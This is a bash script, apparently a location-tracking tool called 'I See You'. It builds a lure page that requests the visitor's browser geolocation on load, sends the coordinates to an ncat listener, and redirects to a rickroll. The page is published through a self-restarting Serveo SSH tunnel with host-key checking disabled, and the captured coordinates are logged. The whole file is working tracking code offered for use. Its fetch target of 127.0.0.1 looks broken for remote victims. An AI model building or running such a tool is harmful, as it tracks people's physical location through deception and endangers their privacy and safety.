#!/bin/bash

clear

# Prompt for server port
read -p "[?] Enter port to use for local server (default 8080): " SERVER_PORT
SERVER_PORT=${SERVER_PORT:-8080}

# Prompt for ncat port
read -p "[?] Enter port to use for logging with Ncat (must differ, default 9999): " NCAT_PORT
NCAT_PORT=${NCAT_PORT:-9999}

WEB_DIR="$HOME/webpage"
LOG_FILE="$HOME/iseeu/logs/log_$(date '+%Y-%m-%d_%H-%M-%S').txt"
mkdir -p "$(dirname "$LOG_FILE")"

echo "[*] Killing existing processes..."
pkill -f "python3 -m http.server" 2>/dev/null
pkill -f ncat 2>/dev/null
pkill -f "ssh -o ServerAliveInterval" 2>/dev/null
sleep 1

echo "[*] Creating/clearing web directory: $WEB_DIR"
mkdir -p "$WEB_DIR"
rm -f "$WEB_DIR/index.html"
cd "$WEB_DIR" || exit 1

echo "[*] Creating payload HTML..."
cat > index.html <<EOF
<!DOCTYPE html>
<html>
<head>
    <title>I See You</title>
    <script>
        function redirectToRickRoll(position) {
            fetch('http://127.0.0.1:$NCAT_PORT/log?loc=' + position.coords.latitude + ',' + position.coords.longitude);
            window.location.href = 'https://shattereddisk.github.io/rickroll/rickroll.mp4';
        }
        function failLocation() {
            alert("Location access denied.");
        }
        window.onload = () => {
            navigator.geolocation.getCurrentPosition(redirectToRickRoll, failLocation);
        };
    </script>
</head>
<body>
    <h1>Loading...</h1>
</body>
</html>
EOF

echo "[*] Starting local server on port $SERVER_PORT..."
python3 -m http.server "$SERVER_PORT" > /dev/null 2>&1 &
SERVER_PID=$!
sleep 2
echo "[+] Python server running (PID $SERVER_PID)"

echo "[*] Starting Serveo tunnel..."
serveo_tunnel() {
    ssh -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -o StrictHostKeyChecking=no -R 80:localhost:$SERVER_PORT serveo.net > serveo.log 2>&1
}
serveo_tunnel &
SSH_PID=$!
sleep 5

TUNNEL_URL=$(grep -oE "https://[a-zA-Z0-9]+\.serveo.net" serveo.log | head -n1)
if [ -n "$TUNNEL_URL" ]; then
    echo "[✓] Public URL: $TUNNEL_URL"
else
    echo "[✗] Failed to get Serveo URL."
    kill $SERVER_PID $SSH_PID
    exit 1
fi

# Auto-restart Serveo if it crashes
echo "[*] Starting Serveo watchdog..."
(
while true; do
    if ! pgrep -f "ssh.*serveo.net" > /dev/null; then
        echo "[!] Serveo tunnel down. Restarting..."
        serveo_tunnel &
    fi
    sleep 30
done
) &

echo "[*] Logging connections with ncat on port $NCAT_PORT..."
ncat -lvkp "$NCAT_PORT" | while read -r line; do
    echo "$(date): $line" >> "$LOG_FILE"
done &
NCAT_PID=$!

trap 'echo "[*] Cleaning up..."; kill $SERVER_PID $SSH_PID $NCAT_PID 2>/dev/null; exit' INT

echo "[*] Press Ctrl+C to stop."
wait